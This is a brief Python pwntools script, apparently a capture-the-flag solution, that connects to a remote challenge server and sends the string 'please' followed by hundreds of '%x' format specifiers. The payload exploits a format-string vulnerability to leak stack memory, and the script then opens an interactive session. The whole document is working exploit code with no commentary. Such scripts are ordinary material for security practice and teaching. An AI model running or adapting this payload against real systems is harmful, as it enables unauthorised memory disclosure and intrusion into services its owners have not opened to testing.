from pwn import *

#p = process("./please")
p = remote("mc.ax", 31569)
#input("attach gdb")

p.recv()

payload = "please" + "%x "*(0x200)
p.sendline(payload)

p.interactive()
